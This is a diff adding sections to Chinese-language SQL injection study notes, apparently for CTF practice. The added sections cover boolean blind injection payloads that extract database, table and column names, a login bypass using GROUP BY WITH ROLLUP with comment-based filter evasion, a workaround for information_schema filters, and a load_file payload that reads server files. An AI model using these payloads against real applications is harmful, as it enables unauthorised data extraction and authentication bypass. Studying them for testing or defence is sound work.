@@ -90,6 +90,52 @@ BENCHMARK函数 用来测试数据库中特定表达式的执行时间，
 
 BENCHMARK(loop_count, expr)，其中loop_count是循环次数，expr是要循环的表达式。
 
+### 布尔盲注
+
+**概念：符合条件返回真值，不符合条件返回假值，利用二分法找到每个字母的ascii码值**
+
+**统一payload**：
+
+```
+?id=-1' and ascii(substr(‘abcd’,1,1))>100 --+
+```
+
+将abcd换为想要查询的语句即可
+
+
+
+**查询库名:**
+
+```
+?id=-1' and ascii(substr((select database()),1,1))>100 --+
+```
+
+这段语句的意思是查询数据库名第一个字母的ascii码是否大于100
+
+
+
+**查询表名：**
+
+```
+?id=-1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>100 --+
+```
+
+limit 0,1是从第零行开始查询1行
+
+
+
+查询列名：
+
+```
+?id=-1' and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='user' limit 0,1),1,1))>100 --+
+```
+
+### 3.时间盲注
+
+## 3.报错注入
+
+### extractvalue报错
+
 # 2.过滤
 
 ## 1.对数字输入有过滤
@@ -235,4 +281,78 @@ SELECT * FROM admin WHERE pass=’ ‘or ’ 6’
 ```
 
  ffifdyop、129581926211651571912466741651878684928这两个字符串经过md5(password,true)之后，首位是数字
+
+## 7.with rollup
+
+**group by（将结果集中的数据行根据选择列的值进行逻辑分组）**
+
+不加group by的查询结果
+
+```sql
+sql语句：select password from user
+```
+
+查询结果：
+
+| password |
+| -------- |
+| 1        |
+| 1        |
+| 2        |
+| 3        |
+
+加入group by的查询结果
+
+```
+sql语句：select password,count(*) from user group by password;
+```
+
+查询结果：
+
+| password | count(*) |
+| -------- | -------- |
+| 1        | 2        |
+| 2        | 1        |
+| 3        | 1        |
+
+
+
+**with rollup （group by 后可以跟with rollup，表示在进行分组统计的基础上再次进行汇总统计）**
+
+```
+sql语句：select password,count(*) from user group by password with rollup;
+```
+
+| password | count(*) |
+| -------- | -------- |
+| 1        | 2        |
+| 2        | 1        |
+| 3        | 1        |
+| NULL     | 4        |
+
+对密码进行验证时可以使用这个，使得NULL=NULL即可
+
+```
+payload:username=admin'/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#&password=
+```
+
+## information_schema.tables、information_schema.columns过滤
+
+使用
+
+```
+information_schema.`tables`
+```
+
+
+
+# 8.直接读取文件
+
+有的sql注入题目可以直接读取一些相关页面，可以读到flag
+
+使用load_file读一下
+
+```
+-1 union select load_file('var/www/html/index.php')
+```
 
